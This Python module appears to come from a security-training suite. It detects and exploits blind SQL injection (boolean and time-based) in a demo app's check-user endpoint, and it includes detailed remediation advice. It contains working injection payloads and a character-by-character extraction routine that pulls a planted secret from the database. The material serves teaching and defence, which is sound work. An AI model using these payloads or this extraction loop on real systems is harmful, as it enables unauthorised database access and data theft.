"""Blind SQL Injection (boolean-based + time-based) -- detect, exploit, remediate.

WHAT IT IS
----------
Blind SQLi is SQL injection where the application never echoes the query result
back to you. The injected statement still executes against the database, but the
only thing the response reveals is a single bit (or, for time-based, *how long*
the server took). The demo app's ``GET /api/check-user?username=`` is the classic
shape: it concatenates the username straight into a query and returns nothing but
a boolean::

    sql = f"SELECT 1 FROM users WHERE username='{username}' LIMIT 1"
    row = db.execute(sql).fetchone()
    return {"exists": bool(row)}            # <-- the ONLY feedback: one bit

There is no error message, no dumped row, no reflected payload -- yet the secret
in ``app_secrets.blind_flag`` is fully recoverable.

HOW WE DISCOVER IT
------------------
We turn that one bit into a *boolean oracle*. We pick a username prefix that we
know does NOT exist (``zz``) so the app's own clause is false, then ``OR`` in a
condition we control and comment out the trailing quote with ``-- ``::

    zz' OR (1=1) --        -> exists:True   (our OR clause is true)
    zz' OR (1=2) --        -> exists:False  (our OR clause is false)

A safe app passes ``username`` as a bound parameter, so neither tail could ever
change the truth value. When ``exists`` flips between a tautology and a
contradiction, the WHERE clause is provably attacker-controlled -> blind SQLi.

We confirm a SECOND, independent channel -- *time-based* -- which works even when
the boolean is masked (e.g. errors and rows both swallowed). SQLite exposes a
user-defined ``sleep()`` here (in real PostgreSQL it is ``pg_sleep()``, in MySQL
``SLEEP()``). Injecting ``zz' OR sleep(0.05) -- `` makes the response measurably
slower than a normal lookup; the timing delta is the signal.

HOW WE EXPLOIT IT
-----------------
With the oracle we extract the secret one character at a time using SQLite
string functions inside a sub-select against the secrets table:

1. **Length.**  binary-search / linear-scan ``length(value)=N`` until ``exists``
   is True -- now we know how many characters to pull.
2. **Each character.**  for position ``i`` in ``1..N`` test
   ``substr(value,i,1)='c'`` over a charset; the ``c`` that returns ``exists:True``
   is character ``i``. Concatenating them reconstructs the full
   ``app_secrets.blind_flag`` -- the planted flag -- with zero direct output.

Every character is recovered with O(charset) requests; the whole flag falls out
of a query whose only reply is one boolean bit.

THE FIX
-------
See :data:`REMEDIATION`. In one line: parameterise the query so ``username`` is
data, never SQL -- then no ``OR``/``sleep`` tail can ever reach the parser.
"""
from __future__ import annotations

import string
import time
from typing import Dict, List, Optional, Tuple

from ._types import Finding, Severity
from .http_client import WebClient
from .targetapp import constants as C

# --------------------------------------------------------------------------- #
# configuration
# --------------------------------------------------------------------------- #
#: The blind oracle endpoint -- returns only ``{"exists": bool}``.
ENDPOINT: str = "/api/check-user?username="

#: Name of the row in ``app_secrets`` whose ``value`` we exfiltrate.
SECRET_NAME: str = "blind_flag"

#: Characters the planted flag can be built from. The flag is
#: ``FLAG{blind_sqli_boolean_time_extraction}`` so the charset is upper/lower
#: ASCII letters, digits, ``_`` and the brace delimiters. Kept deliberately
#: small (a real engagement would widen it) so extraction is fast in tests.
CHARSET: str = (
    string.ascii_uppercase + string.ascii_lowercase + string.digits + "_{}"
)

#: Never pull more than this many characters even if the length oracle misfires;
#: bounds the request count so a misbehaving target can't hang the suite.
MAX_LENGTH: int = 80

#: How long the time-based payload asks the DB to sleep (seconds). The demo's
#: user-defined ``sleep()`` caps at 0.2s so the suite can never stall.
SLEEP_SECONDS: float = 0.05


def _boolean_payload(condition: str) -> str:
    """Wrap ``condition`` in the OR-injection tail for the username parameter.

    A non-matching prefix (``zz``) makes the app's own clause false, so the
    overall row count is driven entirely by ``condition``; ``-- `` comments out
    the original closing quote.
    """
    return f"zz' OR ({condition}) -- "


#: The exact boolean and time-based payloads this engine sends (representative
#: instances; the per-character payloads vary ``i`` and ``c``).
PAYLOADS: List[str] = [
    _boolean_payload("1=1"),
    _boolean_payload("1=2"),
    _boolean_payload(
        f"(SELECT length(value) FROM app_secrets WHERE name='{SECRET_NAME}')=40"
    ),
    _boolean_payload(
        f"(SELECT substr(value,1,1) FROM app_secrets WHERE name='{SECRET_NAME}')='F'"
    ),
    _boolean_payload(f"sleep({SLEEP_SECONDS})"),
]

REMEDIATION: str = (
    "Use parameterised queries / prepared statements so the username is bound as "
    "data and can never become SQL -- e.g. "
    "cursor.execute(\"SELECT 1 FROM users WHERE username = ? LIMIT 1\", (username,)) "
    "(PostgreSQL: %s placeholders with psycopg; .NET: SqlParameter / "
    "Dapper-parameterised; PHP: PDO prepared statements with bound params and "
    "PDO::ATTR_EMULATE_PREPARES=false). Blind/boolean and time-based SQLi defeat "
    "error-suppression alone, so do not rely on hiding output: the structural fix "
    "is parameterisation. Layer defence in depth -- allow-list/validate input "
    "format, run the app under a least-privilege DB role with no access to "
    "unrelated tables (the secrets table here), disable or sandbox dangerous "
    "functions (pg_sleep/SLEEP/UDFs) for that role, and add rate-limiting plus "
    "anomaly alerting since blind extraction is request-intensive (hundreds of "
    "near-identical probes is itself a detectable signal)."
)


# --------------------------------------------------------------------------- #
# the boolean oracle
# --------------------------------------------------------------------------- #
def _exists(client: WebClient, username: str) -> bool:
    """Send one probe; return the single bit the endpoint leaks."""
    resp = client.get("/api/check-user", params={"username": username})
    try:
        return bool(resp.json().get("exists"))
    except Exception:  # noqa: BLE001 - non-JSON / error => treat as "no"
        return False


def _oracle(client: WebClient, condition: str) -> bool:
    """Evaluate an arbitrary SQL boolean ``condition`` through the oracle."""
    return _exists(client, _boolean_payload(condition))


# --------------------------------------------------------------------------- #
# detection
# --------------------------------------------------------------------------- #
def detect_boolean(client: WebClient) -> Tuple[bool, str]:
    """True if a tautology vs. contradiction flips the ``exists`` bit.

    This is the smoking gun for boolean-blind SQLi: two logically different
    injected tails after an identical non-matching prefix return different bits,
    which is only possible if our text reached the WHERE clause.
    """
    true_bit = _oracle(client, "1=1")
    false_bit = _oracle(client, "1=2")
    if true_bit and not false_bit:
        return True, (
            "boolean oracle confirmed: \"zz' OR (1=1) -- \" -> exists:True while "
            "\"zz' OR (1=2) -- \" -> exists:False (WHERE clause is attacker-controlled)"
        )
    return False, ""


def detect_time_based(client: WebClient) -> Tuple[bool, Dict[str, float]]:
    """True if a ``sleep()`` tail makes the response measurably slower.

    Independent of the boolean channel: even with rows and errors both swallowed,
    the wall-clock delay still leaks the truth of an injected condition. We take a
    best-of baseline so transient jitter doesn't produce a false positive.
    """
    baseline = min(_timed(client, "admin") for _ in range(3))
    delayed = _timed(client, _boolean_payload(f"sleep({SLEEP_SECONDS})"))
    timing = {
        "baseline_seconds": round(baseline, 4),
        "injected_sleep_seconds": round(delayed, 4),
        "requested_sleep_seconds": SLEEP_SECONDS,
        "delta_seconds": round(delayed - baseline, 4),
    }
    # The delayed request must clear the requested sleep over the baseline with
    # margin; a non-injectable target would show ~0 delta.
    confirmed = (delayed - baseline) >= (SLEEP_SECONDS * 0.5)
    return confirmed, timing


def _timed(client: WebClient, username: str) -> float:
    start = time.perf_counter()
    _exists(client, username)
    return time.perf_counter() - start


# --------------------------------------------------------------------------- #
# exploitation -- character-by-character extraction
# --------------------------------------------------------------------------- #
def _extract_length(client: WebClient) -> Optional[int]:
    """Recover ``length(app_secrets.blind_flag)`` via the boolean oracle."""
    for n in range(1, MAX_LENGTH + 1):
        cond = (
            f"(SELECT length(value) FROM app_secrets WHERE name='{SECRET_NAME}')={n}"
        )
        if _oracle(client, cond):
            return n
    return None


def _extract_char(client: WebClient, position: int) -> Optional[str]:
    """Recover the 1-indexed ``position``-th character of the secret."""
    for ch in CHARSET:
        # Single-quotes are escaped SQL-style ('' ) so a ``'`` in the charset
        # could never break our own injected literal.
        safe = ch.replace("'", "''")
        cond = (
            f"(SELECT substr(value,{position},1) FROM app_secrets "
            f"WHERE name='{SECRET_NAME}')='{safe}'"
        )
        if _oracle(client, cond):
            return ch
    return None


def extract_secret(client: WebClient) -> Tuple[str, int]:
    """Exfiltrate the full secret one character at a time.

    Returns the recovered string and the number of oracle requests it cost.
    """
    requests = 0
    length = _extract_length(client)
    requests += length if length is not None else MAX_LENGTH
    if not length:
        return "", requests

    recovered: List[str] = []
    for i in range(1, length + 1):
        before = len(recovered)
        ch = None
        # count requests as we scan the charset for this position
        for idx, candidate in enumerate(CHARSET, start=1):
            safe = candidate.replace("'", "''")
            cond = (
                f"(SELECT substr(value,{i},1) FROM app_secrets "
                f"WHERE name='{SECRET_NAME}')='{safe}'"
            )
            requests += 1
            if _oracle(client, cond):
                ch = candidate
                break
        if ch is None:
            break
        recovered.append(ch)
        if len(recovered) == before:  # safety: never loop forever
            break
    return "".join(recovered), requests


# --------------------------------------------------------------------------- #
# public entry point
# --------------------------------------------------------------------------- #
def assess(client: WebClient) -> Finding:
    """Detect blind SQLi on /api/check-user, then exfiltrate the planted flag.

    DISCOVER : boolean oracle (1=1 vs 1=2 flips ``exists``) + time-based sleep().
    EXPLOIT  : character-by-character extraction of ``app_secrets.blind_flag``.
    FIX      : parameterise the username so it can never reach the SQL parser.
    """
    bool_ok, bool_evidence = detect_boolean(client)
    time_ok, timing = detect_time_based(client)
    discovered = bool_ok or time_ok

    evidence_parts: List[str] = []
    if bool_ok:
        evidence_parts.append(bool_evidence)
    if time_ok:
        evidence_parts.append(
            "time-based oracle confirmed: injected sleep("
            f"{SLEEP_SECONDS}) took {timing['injected_sleep_seconds']}s vs "
            f"{timing['baseline_seconds']}s baseline "
            f"(delta {timing['delta_seconds']}s)"
        )
    evidence = " | ".join(evidence_parts) or "no injectable oracle detected"

    secret = ""
    requests = 0
    if discovered:
        secret, requests = extract_secret(client)

    exploit_result = (
        "blind boolean+time SQLi extracted app_secrets.blind_flag "
        f"({len(secret)} chars in {requests} oracle requests): {secret}"
        if secret
        else "no secret recovered"
    )

    return Finding(
        vuln="Blind SQL Injection (boolean + time-based)",
        endpoint=ENDPOINT,
        severity=Severity.HIGH.value,
        discovered=discovered,
        evidence=evidence,
        exploit_result=exploit_result,
        remediation=REMEDIATION,
        payload=_boolean_payload(
            f"(SELECT substr(value,1,1) FROM app_secrets "
            f"WHERE name='{SECRET_NAME}')='F'"
        ),
        extra={
            "boolean_based_detected": bool_ok,
            "time_based_detected": time_ok,
            "timing": timing,
            "charset": CHARSET,
            "max_length": MAX_LENGTH,
            "secret_length": len(secret),
            "recovered_secret": secret,
            "oracle_requests": requests,
            "sample_payloads": PAYLOADS,
        },
    )
